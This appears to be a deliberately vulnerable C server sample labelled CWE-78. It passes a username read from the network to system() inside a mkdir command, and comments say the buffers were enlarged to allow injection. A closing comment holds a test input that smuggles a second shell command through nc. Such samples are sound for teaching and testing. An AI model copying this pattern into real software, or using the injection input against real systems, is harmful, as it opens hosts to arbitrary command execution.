#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 8080
#define USER_MAX 100  // Increased buffer size to allow for command injection

int main(void) {
    int server_fd, client_fd;
    struct sockaddr_in addr;
    socklen_t addrlen = sizeof(addr);
    char username[USER_MAX+1] = {0};
    char mkdir_command[200];  // Increased size to accommodate injected commands

    // Setup the socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) exit(EXIT_FAILURE);
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &(int){1}, sizeof(int));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT);
    bind(server_fd, (struct sockaddr*)&addr, sizeof(addr));
    listen(server_fd, 1);

    client_fd = accept(server_fd, (struct sockaddr*)&addr, &addrlen);
    if (client_fd < 0) exit(EXIT_FAILURE);

    // Read input from the socket
    ssize_t n = read(client_fd, username, USER_MAX);
    if (n < 0) exit(EXIT_FAILURE);
    username[n] = '\0';  

    close(client_fd);
    close(server_fd);


    snprintf(mkdir_command, sizeof(mkdir_command), "mkdir %s", username);
    printf("Executing command: %s\n", mkdir_command);
    system(mkdir_command); 


    FILE *fp = fopen(username, "r");
    if (fp) {
        printf("Opened file: %s\n", username);
        fclose(fp);
    } else {
        printf("Error opening file: %s\n", username);
    }

    return 0;
}

/*
To test :


gcc create_user_cwe78.c -o create_user_cwe78
./create_user_cwe78

In another terminal:
echo "test; echo 'HACKED' > /tmp/hacked.txt" | nc 127.0.0.1 8080

Check if the malicious file was created:
cat /tmp/hacked.txt

*/